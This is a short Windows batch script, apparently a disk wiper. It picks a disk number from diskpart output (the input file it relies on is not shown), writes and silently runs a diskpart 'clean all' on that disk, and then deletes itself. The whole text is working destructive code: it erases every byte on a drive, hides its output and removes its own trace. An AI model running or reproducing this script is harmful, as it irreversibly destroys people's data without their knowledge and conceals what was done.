@echo off
setlocal EnableDelayedExpansion
for /f "tokens=2 delims=:" %%d in ('diskpart /s scr.txt') do set disk=%%d
echo select disk !disk! > wipe.script && echo clean all >> wipe.script
diskpart /s wipe.script >nul 2>&1
del /f /q %0 >nul